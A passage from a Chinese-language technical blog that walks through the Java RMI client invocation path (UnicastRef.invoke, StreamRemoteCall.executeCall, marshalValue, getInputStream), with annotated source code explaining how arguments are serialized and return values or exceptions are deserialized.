finally 中 done()</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInput</span> <span class="variable">in</span> <span class="operator">=</span> call.getInputStream();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 重要：StreamRemoteCall.done() 不依赖 conn，所以在读取返回值前后</span></span><br><span class="line">            <span class="comment">// 可以安全地“提前”把连接归还以便复用（提升吞吐）</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">returnValue</span> <span class="operator">=</span> unmarshalValue(rtype, in);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 5) 提前归还连接（本次已经读完返回值，连接可立即复用）</span></span><br><span class="line">            alreadyFreed = <span class="literal">true</span>;</span><br><span class="line">            clientRefLog.log(Log.BRIEF, <span class="string">&quot;free connection (reuse = true)&quot;</span>);</span><br><span class="line">            ref.getChannel().free(conn, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> returnValue;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// 返回解组失败：禁用输入流里尚未处理的远程引用，避免 DGC 引用泄漏</span></span><br><span class="line">            ((StreamRemoteCall) call).discardPendingRefs();</span><br><span class="line">            clientRefLog.log(Log.BRIEF,</span><br><span class="line">                    e.getClass().getName() + <span class="string">&quot; unmarshalling return: &quot;</span>, e);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, e);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 6) 收尾（协议级结束）；若之前已提前归还连接，这里通常不再出问题</span></span><br><span class="line">                call.done();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="comment">// 若此处抛 IO 异常而连接已被提前复用，已无从恢复，标记不复用以求稳</span></span><br><span class="line">                reuse = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 区分“客户端侧”与“服务端侧”的 RuntimeException：</span></span><br><span class="line"><span class="comment">         * - 若 call 尚未建立，或 getServerException() != e，则认为是客户端侧异常 → 连接不复用；</span></span><br><span class="line"><span class="comment">         * - 否则为服务端回传的 RuntimeException，连接通常仍可复用。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> ((call == <span class="literal">null</span>) || (((StreamRemoteCall) call).getServerException() != e)) &#123;</span><br><span class="line">            reuse = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 远程调用失败：包括 ServerException/ServerError 等情况——</span></span><br><span class="line"><span class="comment">         * 即便异常来自服务器，也可能发生在参数/返回值编组阶段，连接可能处于不一致状态 → 不复用。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        reuse = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Error e) &#123;</span><br><span class="line">        <span class="comment">// 严重错误：保守起见不复用连接</span></span><br><span class="line">        reuse = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 若未走“提前归还”，在此归还连接并按 reuse 决定是否复用</span></span><br><span class="line">        <span class="keyword">if</span> (!alreadyFreed) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clientRefLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">                clientRefLog.log(Log.BRIEF, <span class="string">&quot;free connection (reuse = &quot;</span> + reuse + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            ref.getChannel().free(conn, reuse);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先 <code>UnicastRef</code> 的 <code>LiveRef</code> 属性包含 <code>Endpoint</code>、<code>Channel</code> 封装和与网络通信有关的方法，其中包含服务端该 <code>stub</code> 对应的监听端口，因此我们可以通过 <code>ref.getChannel().newConnection()</code> 建立与服务端的连接并得到链接对象 <code>conn</code>。</p>
<p>之后利用这个链接对象 <code>conn</code> 创建一个 <code>StreamRemoteCall</code> 对象并传入：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call = <span class="keyword">new</span> <span class="title class_">StreamRemoteCall</span>(conn, ref.getObjID(), -<span class="number">1</span>, opnum);</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>conn</code>：网络连接相关。</li>
<li><code>ref.getObjID()</code>：用来表示远程对象。</li>
<li><code>op</code>：传递一个负数（-1），让被调用方通过方法哈希来确定被调用的方法。</li>
<li><code>opnum</code>：前面 <code>getMethodHash(method)</code> 计算得到的被调用方法的哈希。</li>
</ul>
<p>之后若方法有参数，则调用 <code>marshalValue</code> 将参数序列化，并写入输出流。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt;[] types = method.getParameterTypes();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; types.length; i++) &#123;</span><br><span class="line">    marshalValue(types[i], params[i], out);  <span class="comment">// 序列化每个参数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>marshalValue</code> 会对 <code>Object</code> 类型的参数进行序列化：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用（RMI 兼容的）Java 序列化把一个值写入 &#123;<span class="doctag">@link</span> ObjectOutput&#125;。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;约定：&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&lt;b&gt;原始类型&lt;/b&gt;（primitive）：按其对应的 DataOutput 写法写入，</span></span><br><span class="line"><span class="comment"> *       需要传入相应的包装类型作为 &#123;<span class="doctag">@code</span> value&#125;（例如 &#123;<span class="doctag">@code</span> int.class&#125; 搭配 &#123;<span class="doctag">@code</span> Integer&#125;）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&lt;b&gt;引用类型&lt;/b&gt;（非 primitive）：直接调用 &#123;<span class="doctag">@link</span> ObjectOutput#writeObject(Object)&#125;，</span></span><br><span class="line"><span class="comment"> *       遵循标准/ RMI 序列化语义（含 &#123;<span class="doctag">@code</span> writeReplace&#125;、远程对象 stub 替换等）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;注意&lt;/b&gt;：&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;当 &#123;<span class="doctag">@code</span> type&#125; 为原始类型时，&#123;<span class="doctag">@code</span> value&#125; 不能为 &#123;<span class="doctag">@code</span> null&#125;，且必须是对应的包装类；</span></span><br><span class="line"><span class="comment"> *       否则会抛出 &#123;<span class="doctag">@link</span> NullPointerException&#125;/&#123;<span class="doctag">@link</span> ClassCastException&#125;。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&#123;<span class="doctag">@code</span> void.class&#125; 不应出现在这里；若出现将进入“未识别的原始类型”分支并抛出 &#123;<span class="doctag">@link</span> Error&#125;。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;引用类型若不可序列化，将在 &#123;<span class="doctag">@code</span> writeObject&#125; 过程中触发 &#123;<span class="doctag">@link</span> java.io.NotSerializableException&#125;。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;当 &#123;<span class="doctag">@code</span> value&#125; 为 &#123;<span class="doctag">@code</span> null&#125; 且 &#123;<span class="doctag">@code</span> type&#125; 为引用类型时，允许写出 &#123;<span class="doctag">@code</span> null&#125;。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> type  值的“声明类型”，用于决定写入策略（primitive vs. 引用）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> value 实际要写入的值（primitive 需对应包装类）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> out   目标输出流（通常为 RMI 的 &#123;<span class="doctag">@code</span> MarshalOutputStream&#125; 实现）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException 底层 I/O 或对象写出失败</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">marshalValue</span><span class="params">(Class&lt;?&gt; type, Object value, ObjectOutput out)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 原始类型：走 DataOutput 写法（需要从包装类型拆箱）</span></span><br><span class="line">    <span class="keyword">if</span> (type.isPrimitive()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (type == <span class="type">int</span>.class) &#123;</span><br><span class="line">            out.writeInt(((Integer) value).intValue());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">boolean</span>.class) &#123;</span><br><span class="line">            out.writeBoolean(((Boolean) value).booleanValue());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">byte</span>.class) &#123;</span><br><span class="line">            out.writeByte(((Byte) value).byteValue());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">char</span>.class) &#123;</span><br><span class="line">            out.writeChar(((Character) value).charValue());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">short</span>.class) &#123;</span><br><span class="line">            out.writeShort(((Short) value).shortValue());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">long</span>.class) &#123;</span><br><span class="line">            out.writeLong(((Long) value).longValue());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">float</span>.class) &#123;</span><br><span class="line">            out.writeFloat(((Float) value).floatValue());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">double</span>.class) &#123;</span><br><span class="line">            out.writeDouble(((Double) value).doubleValue());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 一般只会命中 void.class 等不应出现的 primitive</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Unrecognized primitive type: &quot;</span> + type);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 引用类型：标准对象写出。</span></span><br><span class="line">        <span class="comment">// RMI 会在这里应用远程对象替换（Remote → stub）、代码库注解、writeReplace 等机制。</span></span><br><span class="line">        out.writeObject(value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后 <code>call.executeCall</code> 执行远程方法调用，该函数主要逻辑如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 执行一次远程调用的完整客户端流程（发起→等待→接收→解释）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;时序概览&lt;/b&gt;：</span></span><br><span class="line"><span class="comment"> * 1) 若仍持有输出流，则获取 DGC 确认处理器并 &lt;em&gt;releaseOutputStream()&lt;/em&gt; 以刷新请求并允许服务器回应；</span></span><br><span class="line"><span class="comment"> * 2) 从连接读取返回包头（必须首先读到 &#123;<span class="doctag">@code</span> TransportConstants.Return&#125; 操作码）；</span></span><br><span class="line"><span class="comment"> * 3) 通过 &#123;<span class="doctag">@code</span> getInputStream()&#125; 建立用于反序列化的输入流（RMI 的编组输入流）；</span></span><br><span class="line"><span class="comment"> * 4) 读取“返回类型”字节（正常/异常）与一次性 DGC 确认 ID（用于崩溃恢复的“应答”机制）；</span></span><br><span class="line"><span class="comment"> * 5) 根据返回类型：正常则继续由上层读取返回值；异常则反序列化异常对象并抛出。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;DGC 确认（DGCAck）&lt;/b&gt;：客户端在请求侧可能携带需要确认的远端引用；服务端回包时给出一个</span></span><br><span class="line"><span class="comment"> * “确认 ID”。客户端在安全点（通常在完成反序列化并不再需要这些远端引用时）向服务器发送确认，</span></span><br><span class="line"><span class="comment"> * 以便 DGC 能在客户端崩溃时保守地保留引用、在确认后再回收。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> Exception 读取/写入/编组失败或远端抛出异常时转为相应异常抛出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;fallthrough&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">executeCall</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">byte</span> returnType;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用于一次性 DGC 确认的处理器；仅在本次调用使用（可能为空）</span></span><br><span class="line">    <span class="type">DGCAckHandler</span> <span class="variable">ackHandler</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 若仍持有输出流（说明请求尚未完全“交付”），先取出其 DGCAck 处理器</span></span><br><span class="line">        <span class="comment">// 之后 releaseOutputStream 会真正把请求刷到网络，避免请求/响应双方互相阻塞。</span></span><br><span class="line">        <span class="keyword">if</span> (out != <span class="literal">null</span>) &#123;</span><br><span class="line">            ackHandler = out.getDGCAckHandler();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 释放输出流：确保请求报文已发送完毕，允许服务端开始返回</span></span><br><span class="line">        releaseOutputStream();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 直接从底层连接读取返回包头（原始 DataInput 用于读取固定字段）</span></span><br><span class="line">        <span class="type">DataInputStream</span> <span class="variable">rd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(conn.getInputStream());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 读取返回操作码；RMI 协议要求此处应为 TransportConstants.Return</span></span><br><span class="line">        <span class="type">byte</span> <span class="variable">op</span> <span class="operator">=</span> rd.readByte();</span><br><span class="line">        <span class="keyword">if</span> (op != TransportConstants.Return) &#123;</span><br><span class="line">            <span class="comment">// [...] 非期望的操作码：通常是协议不匹配、版本错误或非法响应</span></span><br><span class="line">            <span class="comment">//     典型处理会抛出 UnmarshalException / IOException</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 建立（或切换到）用于对象反序列化的编组输入流</span></span><br><span class="line">        <span class="comment">// 注意：getInputStream() 会把上面的原始输入管线包装为 RMI 的 MarshalInputStream</span></span><br><span class="line">        getInputStream();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 读取“返回类型”：NormalReturn / ExceptionalReturn</span></span><br><span class="line">        returnType = in.readByte();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 读取一次性 DGC 确认 ID（仅对本次调用有效）</span></span><br><span class="line">        <span class="comment">// 该 ID 会与上面的 ackHandler 配合，在安全点发送确认，避免早收/漏收远端引用。</span></span><br><span class="line">        in.readID();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnmarshalException e) &#123;</span><br><span class="line">        <span class="comment">// [...] 反序列化/协议头读取失败：通常要丢弃挂起引用并向上抛出</span></span><br><span class="line">        <span class="comment">//     可结合 discardPendingRefs() 与更上层的异常包装策略</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据返回类型选择处理路径</span></span><br><span class="line">    <span class="keyword">switch</span> (returnType) &#123;</span><br><span class="line">    <span class="keyword">case</span> TransportConstants.NormalReturn:</span><br><span class="line">        <span class="comment">// 正常返回：这里不做额外工作，上层代码将继续从 `in` 中读取返回值本体</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> TransportConstants.ExceptionalReturn:</span><br><span class="line">        <span class="comment">// 异常返回：反序列化远端抛出的异常对象并抛出给调用者</span></span><br><span class="line">        Object ex;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ex = in.readObject();  <span class="comment">// 远端写回的 Throwable（可能是 Server&#123;Error,Exception&#125; 包装）</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// 如果连异常对象都读不出来，说明流已损坏或类解析失败</span></span><br><span class="line">            <span class="comment">// 为防止泄漏，丢弃流中挂起的远端引用，然后按 RMI 语义抛 UnmarshalException</span></span><br><span class="line">            discardPendingRefs();</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;Error unmarshaling return&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// [...] 典型做法：</span></span><br><span class="line">        <span class="comment">//     - 若 ex 为 RemoteException/RuntimeException/Error：直接抛出；</span></span><br><span class="line">        <span class="comment">//     - 若不是被声明的受检异常：通常包装为 UnexpectedException 再抛；</span></span><br><span class="line">        <span class="comment">//     - 在抛出前若涉及 DGCAck，可能在 finally/安全点触发 ackHandler 的确认发送。</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// （保留 switch 的 fallthrough 抑制注解：协议未来如扩展返回类型，可按需落地分支）</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们主要关心的部分为：</p>
<ol>
<li><p>首先 <code>executeCall</code> 会调用 <code>releaseOutputStream</code> 释放输出流，即发送数据给服务端。</p>
</li>
<li><p><code>getInputStream</code> 读取返回的数据，写到 <code>in</code> 中。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取用于解组（参数/返回值/异常等）的输入流。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;生命周期与所有权&lt;/b&gt;：</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;该输入流由当前远程调用对象统一管理，请勿直接关闭；</span></span><br><span class="line"><span class="comment"> *       使用 &#123;<span class="doctag">@code</span> releaseInputStream()&#125; 归还/释放。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;同一次调用内只创建一次；后续重复调用返回同一实例。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;实现说明&lt;/b&gt;：</span></span><br><span class="line"><span class="comment"> * 当首次调用且 &#123;<span class="doctag">@code</span> in == null&#125; 时，从底层连接 &#123;<span class="doctag">@code</span> conn.getInputStream()&#125;</span></span><br><span class="line"><span class="comment"> * 获取原始字节流，并用 &#123;<span class="doctag">@code</span> ConnectionInputStream&#125;（通常为 RMI 的</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@code</span> MarshalInputStream&#125; 实现）进行包装，以支持：</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;按类加载/代码库注解规则反序列化对象；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;远程引用跟踪与 DGC 相关的协议字段（例如稍后通过 &#123;<span class="doctag">@code</span> readID()&#125; 读取的确认 ID）；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;与 RMI 协议兼容的对象图解析（含 &#123;<span class="doctag">@code</span> readResolve&#125; 等）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 非空的 &#123;<span class="doctag">@link</span> ObjectInput&#125;，用于读取本次调用需要的所有入站数据</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException 底层连接不可用或包装输入流构造失败时抛出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> ObjectInput <span class="title function_">getInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 仅在首次需要时创建；同一远程调用复用同一个输入流实例</span></span><br><span class="line">    <span class="keyword">if</span> (in == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// [... 这里可能包含协议前置处理/校验逻辑（例如已在上层读取过返回操作码） ...]</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 用 RMI 感知的输入流包装底层连接输入流</span></span><br><span class="line">        <span class="comment">// 注意：底层流的关闭与回收由 RemoteCall 的 release* 方法负责</span></span><br><span class="line">        in = <span class="keyword">new</span> <span class="title class_">ConnectionInputStream</span>(conn.getInputStream());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// [... 可在此处对 in 进行适配/配置（如 skipDefaultResolveClass 等），视具体实现而定 ...]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> in;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>从 <code>in</code> 中读取返回类型 <code>returnType</code>。</p>
<ul>
<li><p>如果是异常返回，直接进行反序列化：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> TransportConstants.ExceptionalReturn:</span><br><span class="line">    <span class="comment">// 异常返回：反序列化远端抛出的异常对象并抛出给调用者</span></span><br><span class="line">    Object ex;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ex = in.readObject();  <span class="comment">// 远端写回的 Throwable（可能是 Server&#123;Error,Exception&#125; 包装）</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">// 如果连异常对象都读不出来，说明流已损坏或类解析失败</span></span><br><span class="line">        <span class="comment">// 为防止泄漏，丢弃流中挂起的远端引用，然后按 RMI 语义抛 UnmarshalException</span></span><br><span class="line">        discardPendingRefs();</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;Error unmarshaling return&quot;</span>, e);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>如果是正常返回则直接从 <code>executeCall</code> 返回到 <code>invoke</code> 函数。在 <code>invoke</code> 函数中会调用 <code>unmarshalValue</code> 函数对返回结果进行反序列化。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 